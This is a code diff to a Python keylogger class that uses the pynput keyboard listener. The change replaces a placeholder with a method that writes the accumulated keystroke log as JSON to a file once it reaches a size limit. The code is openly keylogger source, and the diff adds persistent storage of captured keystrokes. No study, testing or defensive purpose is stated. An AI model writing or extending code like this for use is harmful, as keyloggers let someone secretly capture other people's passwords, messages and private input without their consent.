@@ -1,5 +1,5 @@
 from pynput import keyboard
-import threading
+import threading, json
 from typing import Optional
 from datetime import datetime
 
@@ -32,7 +32,16 @@ class Keylogger:
         self.log.append(log_entry)
 
         if len(self.log) >= self.max_log_size:
-            pass
+            self._save_log_to_file()
+
+    def _save_log_to_file(self) -> None:
+        if not self.log_file:
+            return
+
+        log_data = json.dumps(self.log, indent=2)
+        with open(self.log_file, "a", encoding="utf-8") as f:
+            f.write(log_data + "\n")
+        self.log.clear()
 
     def _start_listener(self) -> None:
         with keyboard.Listener(on_press=self._on_press) as listener:
